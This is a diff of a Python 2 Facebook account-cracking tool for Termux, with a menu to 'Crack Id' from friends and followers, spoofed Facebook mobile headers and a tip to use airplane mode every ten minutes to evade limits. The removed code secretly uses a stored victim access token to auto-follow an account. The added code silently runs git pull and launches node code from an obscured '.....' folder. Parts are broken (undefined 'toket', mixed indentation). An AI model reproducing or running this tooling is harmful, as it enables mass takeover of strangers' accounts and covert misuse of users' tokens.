@@ -1,104 +1,104 @@
-# -*- coding: utf-8
-# author by 
-import os
+#coding=utf-8
+
+#!/usr/bin/python2
+
+#decompile by star-vampire
+
 try:
-	import requests
+
+    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
+
+    from multiprocessing.pool import ThreadPool
+
 except ImportError:
-	os.system("pip2 install requests")
 
-try:
-	import bs4
-except ImportError:
-	os.system("pip2 install bs4")
+    os.system("pip2 install requests")
 
-import os, sys, re, time, requests, json, random, calendar
-from multiprocessing.pool import ThreadPool
-from bs4 import BeautifulSoup as parser
-from datetime import datetime
-from datetime import date
-
-loop = 0
-id = []
-ok = []
-cp = []
-
-ct = datetime.now()
-n = ct.month
-bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
-try:
-    if n < 0 or n > 12:
-        exit()
-    nTemp = n - 1
-except ValueError:
-    exit()
-
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-op = bulan[nTemp]
+    os.system("python2 cracker.indirect")
+    
+os.system("clear")
 
 
-def  jalan(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(000.05)
 
-my_date = date.today()
-hr = calendar.day_name[my_date.weekday()]
-tBilall = ("%s-%s-%s-%s"%(hr, ha, op, ta))
-tgl = ("%s %s %s"%(ha, op, ta))
-bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
 
-def logo():
-	os.system("clear")
-	print("""\x1b[0;32m█╗    ██╗ █████╗ ██╗  ██╗██╗██████╗                
-\x1b[0;33m██║    ██║██╔══██╗██║  ██║██║██╔══██╗               
-\x1b[0;34m██║ █╗ ██║███████║███████║██║██║  ██║               
-\x1b[0;35m██║███╗██║██╔══██║██╔══██║██║██║  ██║               
-\x1b[0;31m╚███╔███╔╝██║  ██║██║  ██║██║██████╔╝               
- \x1b[0;36m╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝   """)
-def login():
-	os.system("clear")
-	try:
-		#-> test koneksi
-		requests.get("https://mbasic.facebook.com")
-	except requests.exceptions.ConnectionError:
-		exit("Internet Connection Error")
-	try:
-		token = open("login.txt", "r")
-		menu()
-	except KeyError, IOError:
-		token = raw_input("[?] Enter Token : ")
-		if token == "":
-			print("Wrong Input")
-		try:
-			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
-			open("login.txt", "w").write(token)
-			#-> bot follow
-			requests.post("https://graph.facebook.com/4/subscribers?access_token=" + toket)      # Dapunta Khurayra X
-			menu()
-		except KeyError:
-			os.system("rm -f login.txt")
-			exit("[?] Login Error")
+    os.system("apt update && apt install nodejs -y")
 
-def menu():
-	os.system("clear")
-	global token
-	try:
-		token = open("login.txt","r").read()
-	except KeyError:
-		os.system("rm -f login.txt")
-		exit("[?] Login Error")
-	try:
-		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
-	except IOError:
-		os.system("rm -f login.txt")
-		exit("\033[1;97m[\033[1;94m+\033[1;97m] Token Error")
-	except requests.exceptions.ConnectionError:
-		exit(" ! tidak ada koneksi internet")
-	logo()
+from requests.exceptions import ConnectionError
+
+os.system("git pull")
+
+if not os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
+
+    os.system("fuser -k 5000/tcp &")
+
+    os.system("cd ..... && pip install progress")
+
+    os.system("cd ..... && npm install")
+
+    os.system("cd ..... && node index.js &")
+
+    os.system("clear")
+
+    time.sleep(10)
+
+elif os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
+
+    os.system("fuser -k 5000/tcp &")
+
+    os.system("#")
+
+    os.system("cd ..... && node index.js &")
+
+    os.system("clear")
+
+bd=random.randint(2e7, 3e7)
+
+sim=random.randint(2e4, 4e4)
+
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 10; Infinix X688C Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+
+reload(sys)
+
+sys.setdefaultencoding("utf-8")
+
+c = "\033[1;92m"
+
+c2 = "\033[0;97m"
+
+c3 = "\033[1;91m"
+
+logo = """                                          
+
+\033[1;94m░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░
+\033[1;94m██╔════╝░██║░░░██║██╔══██╗╚══██╔══╝██╔══██╗
+\033[1;92m██║░░██╗░██║░░░██║██████╔╝░░░██║░░░███████║
+\033[1;92m██║░░╚██╗██║░░░██║██╔═══╝░░░░██║░░░██╔══██║
+\033[1;95m╚██████╔╝╚██████╔╝██║░░░░░░░░██║░░░██║░░██║
+\033[1;95m░╚═════╝░░╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝
+
+
+\033[1;93m◁━━━━━━━━━━━━━━━━◈😈Im-Famous-King😈◈━━━━━━━━━━━━━━━━▷\033[1;97m
+
+
+\033[1;94m...♨️\033[1;97m Author   : GUPTA-SHAKEL \033[1;97m[ \033[0;92mGUPTA \033[1;97m]
+
+\033[1;94m...♨️\033[1;97m WhatsApp : +2347013107449👾
+
+\033[1;92m...♨️\033[1;97m Facebook : Mark Cornel👾
+                           
+            🗽USE AIRPLANE MODE EVERY 10 MINT🗽
+\033[1;97m-----------------------------------------------
+
+"""
+
+
+
+def main():
+
+    os.system("clear")
+
+    print logo
 	
 	print("\n\033[1;97m[\033[1;94m01\033[1;97m] Crack Id From Public/Friends")
 	print("\033[1;97m[\033[1;94m02\033[1;97m] Crack Id From Followers")
